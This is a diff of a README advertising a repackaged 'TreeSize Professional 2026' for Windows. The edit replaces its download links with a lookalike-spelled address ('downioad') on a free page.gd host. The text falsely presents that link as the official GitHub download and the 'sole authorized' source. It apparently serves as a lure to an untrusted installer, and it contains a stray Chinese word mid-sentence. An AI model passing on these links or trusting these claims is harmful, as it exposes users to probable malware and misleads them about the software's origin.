@@ -2,7 +2,7 @@
 
 TreeSize Professional 2026 is an advanced disk space management tool tailored for Windows 10 and 11 users. It offers comprehensive analysis of storage usage, enabling you to identify and remove unnecessary files to reclaim disk space. This enhanced edition includes additional utilities for optimal performance and user convenience, making it a must-have for efficient disk maintenance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -65,6 +65,6 @@ A: For assistance, refer to the documentation included with the software or visi
 
 To download TreeSize Professional 2026, click the link below. This will take you to the official download page where you can获取 the latest version.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Ensure that you download only from trusted sources to maintain system security. The provided link is the sole authorized download location for this tool, so avoid any alternative sites to prevent potential issues.
